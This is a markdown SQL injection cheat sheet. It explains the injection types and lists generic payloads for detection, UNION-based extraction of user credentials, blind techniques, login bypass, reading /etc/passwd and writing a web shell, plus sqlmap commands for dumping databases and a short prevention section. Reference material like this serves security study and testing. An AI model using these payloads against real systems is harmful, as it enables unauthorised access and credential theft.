# SQL Injection (SQLi)

## What is SQLi?

SQL Injection occurs when user-supplied input is embedded into a SQL query without proper sanitization, allowing an attacker to manipulate the query logic. This can lead to data extraction, authentication bypass, file read/write, and in some cases remote code execution.

---

## Types of SQLi

### 1. In-Band SQLi
Results are returned directly in the application response.

- **Error-Based** — Forces DB errors that reveal information.
- **Union-Based** — Uses `UNION SELECT` to retrieve data from other tables.

### 2. Blind SQLi
No visible output — infer results from app behavior.

- **Boolean-Based** — Ask true/false questions via conditions.
- **Time-Based** — Use `SLEEP()` or `WAITFOR DELAY` to infer results.

### 3. Out-of-Band SQLi
Data is exfiltrated via a separate channel (DNS, HTTP). Requires specific DB features (e.g., `xp_cmdshell`, `load_file`).

---

## Detection

```sql
-- Single quote to break syntax
'
-- Logic tests
' OR '1'='1
' AND '1'='2
-- Comment out rest of query
' --
' #
' /*
```

---

## Union-Based Extraction

```sql
-- Step 1: Find number of columns
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   <-- error means 3 columns exist

-- Step 2: Find printable columns
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 'a',NULL,NULL--

-- Step 3: Extract data
' UNION SELECT username,password,NULL FROM users--

-- Extract DB version
' UNION SELECT @@version,NULL,NULL--

-- Extract current DB
' UNION SELECT database(),NULL,NULL--

-- List tables (MySQL)
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()--
```

---

## Boolean-Based Blind

```sql
-- True condition (page loads normally)
' AND 1=1--

-- False condition (page changes/errors)
' AND 1=2--

-- Extract data character by character
' AND SUBSTRING(username,1,1)='a'--
' AND ASCII(SUBSTRING(password,1,1))>97--
```

---

## Time-Based Blind

```sql
-- MySQL
' AND SLEEP(5)--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--

-- PostgreSQL
'; SELECT pg_sleep(5)--

-- Oracle
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
```

---

## Authentication Bypass

```sql
-- Classic bypass (if input goes into WHERE clause)
admin'--
' OR '1'='1'--
' OR 1=1--
anything' OR 'x'='x
```

---

## File Read/Write (MySQL)

```sql
-- Read a file (requires FILE privilege)
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL--

-- Write a webshell
' UNION SELECT '' INTO OUTFILE '/var/www/html/shell.php'--
```

---

## Database Fingerprinting

| DB | Version Query |
|---|---|
| MySQL | `SELECT @@version` |
| MSSQL | `SELECT @@version` |
| PostgreSQL | `SELECT version()` |
| Oracle | `SELECT * FROM v$version` |
| SQLite | `SELECT sqlite_version()` |

---

## sqlmap Cheatsheet

```bash
# Basic scan
sqlmap -u "http://target.com/page?id=1"

# POST request
sqlmap -u "http://target.com/login" --data="user=admin&pass=test"

# Dump all databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Dump tables from DB
sqlmap -u "http://target.com/page?id=1" -D dbname --tables

# Dump columns and data
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump

# Use cookies (authenticated session)
sqlmap -u "http://target.com/page?id=1" --cookie="PHPSESSID=abc123"

# Risk and level (aggressive mode)
sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3
```

---

## Prevention

- **Parameterized queries / prepared statements** — the single most effective defense
- **Stored procedures** (used correctly)
- **Input validation** — whitelist expected formats
- **Least privilege DB accounts** — app user shouldn't have `DROP`, `FILE` privileges
- **WAF** — can help but not a substitute for secure code
- **Error handling** — never expose DB errors to users

---

## References

- [PortSwigger SQLi](https://portswigger.net/web-security/sql-injection)
- [OWASP SQLi](https://owasp.org/www-community/attacks/SQL_Injection)
- [PayloadsAllTheThings - SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
